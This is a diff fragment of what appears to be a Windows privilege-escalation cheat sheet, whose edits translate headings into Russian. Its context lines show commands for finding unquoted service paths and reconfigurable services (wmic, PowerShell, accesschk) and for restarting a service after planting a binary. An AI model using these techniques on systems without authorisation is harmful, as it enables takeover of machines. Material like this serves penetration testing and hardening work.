@@ -117,7 +117,7 @@ wmic service get name,displayname,pathname,startmode | findstr /i "auto" | finds
 # → Try: C:\Program.exe, C:\Program Files\Vulnerable.exe
 ```
 
-Exploit unquoted service path by placing binary at first space-split location
+Эксплуатация пути службы без кавычек путём размещения бинарника в первом каталоге, получаемом при разбиении пути по пробелу
 
 ```
 # If C:\Program Files\Vulnerable App\service.exe is unquoted:
@@ -128,14 +128,14 @@ sc stop VulnerableService
 sc start VulnerableService
 ```
 
-PowerShell method to enumerate unquoted auto-start services
+Метод PowerShell для перечисления автозапускаемых служб с путями без кавычек.
 
 ```
 # PowerShell one-liner to find unquoted service paths:
 Get-WmiObject -Class win32_service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' ' -and $_.StartMode -eq "Auto"} | Select Name, PathName
 ```
 
-Find services that current user can reconfigure
+Поиск служб, которые текущий пользователь может перенастроить.
 
 ```
 # Check service permissions with accesschk:
@@ -144,7 +144,7 @@ accesschk.exe -uwcqv <username> *
 # Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG
 ```
 
-Change service binary path to malicious command or executable
+Изменение пути к бинарнику службы на вредоносную команду или исполняемый файл
 
 ```
 # If SERVICE_CHANGE_CONFIG on a service:
